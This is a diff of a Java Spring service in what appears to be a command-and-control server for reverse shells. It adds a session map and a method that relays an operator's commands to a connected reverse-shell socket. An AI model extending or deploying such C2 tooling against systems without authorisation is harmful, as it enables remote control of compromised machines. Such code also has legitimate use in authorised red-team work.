@@ -11,22 +11,25 @@ import com.mtattab.c2cServer.service.factory.CommandFactory;
 import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
 import com.mtattab.c2cServer.util.DataManipulationUtil;
 import com.mtattab.c2cServer.util.SocketUtil;
+import lombok.Data;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
+
 import org.springframework.context.ApplicationListener;
 import org.springframework.stereotype.Service;
 import org.springframework.web.socket.TextMessage;
 import org.springframework.web.socket.WebSocketSession;
 
-import java.io.IOException;
 import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
-import java.util.Objects;
 import java.util.Optional;
 
 
 @Service
 @Slf4j
+@Data
+
 public class ReverseShellManagerObserverServiceImpl implements  ApplicationListener<MessageEventModel>, ReverseShellManagerService {
 
     @Autowired
@@ -36,6 +39,8 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
     @Autowired
     CommandFactory commandFactory;
 
+    HashMap<WebSocketSession , WebSocketSession > connectedSessions= new HashMap<>();
+
     @Override
     public void onApplicationEvent(MessageEventModel messageEventModels) {
         log.info("[+] onApplicationEvent triggered with event {}",messageEventModels);
@@ -44,7 +49,7 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
                 .findFirst();
 
         if (matchingEvent.isPresent()) {
-            matchingEvent.get().getEventHandler().handle(messageEventModels.getSession(), activeSessionsObservable.getActiveMangerSessions());
+            matchingEvent.get().getEventHandler().handle(messageEventModels, activeSessionsObservable.getActiveMangerSessions(), connectedSessions);
         } else {
             log.error("[-] Event Not Found");
             throw new RuntimeException("Something wrong happened while handling observable change event" );
@@ -58,10 +63,14 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
         activeSessionsObservable.removeManagerSession(managerSession);
     }
 
-    public void handleManagerSession(WebSocketSession session, TextMessage message) throws IOException {
-        if (handleManagerCommandMessage(session,message)){
+    public void handleManagerSession(WebSocketSession session, TextMessage message) {
+        System.out.println(connectedSessions);
+        if (connectedSessions.get(session)!=null){
+            handleConnectedManagerCommandMessage(session, message);
 
-        }else {
+        }
+        else
+            if (!handleManagerCommandMessage(session,message)){
             SocketUtil.sendMessage(session, new TextMessage(
                     DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                             .msg("Command Not Found. Use '"+ManagerCommands.HELP.getCommand()+"' for list of commands")
@@ -86,6 +95,24 @@ public class ReverseShellManagerObserverServiceImpl implements  ApplicationListe
             return false;
         }
 
+    }
+
+    public void handleConnectedManagerCommandMessage(WebSocketSession session, TextMessage message) {
+        String mangerMessage = message.getPayload();
+
+        System.out.println("reverse shell connected");
+        WebSocketSession targetReverseShellSocket= connectedSessions.get(session);
+
+        SocketUtil.sendMessage(targetReverseShellSocket, new TextMessage(
+                DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
+                        .msg(mangerMessage)
+                        .masterSessionId(session.getId())
+                        .build()
+                )));
+        log.debug("Manager input is: {}",mangerMessage);
+        List<String> userInputAsList= DataManipulationUtil.stringToList(mangerMessage, " ");
+
 
     }
+
 }
